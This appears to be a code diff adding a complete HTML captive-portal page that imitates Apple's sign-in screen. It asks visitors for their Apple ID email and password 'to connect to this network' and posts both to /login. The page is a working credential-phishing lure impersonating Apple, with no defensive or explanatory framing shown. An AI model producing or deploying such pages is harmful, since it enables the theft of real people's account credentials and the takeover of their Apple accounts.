@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple ID Login</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { padding: 20px; width: 90%; max-width: 400px; text-align: center; }
+        h1 { font-size: 24px; color: #000; font-weight: 600; }
+        p { color: #86868b; font-size: 14px; margin-bottom: 30px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #d2d2d7; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; background-color: #0071e3; color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 500; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Sign in with Apple ID</h1>
+        <p>Use your Apple ID to connect to this network.</p>
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Apple ID" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
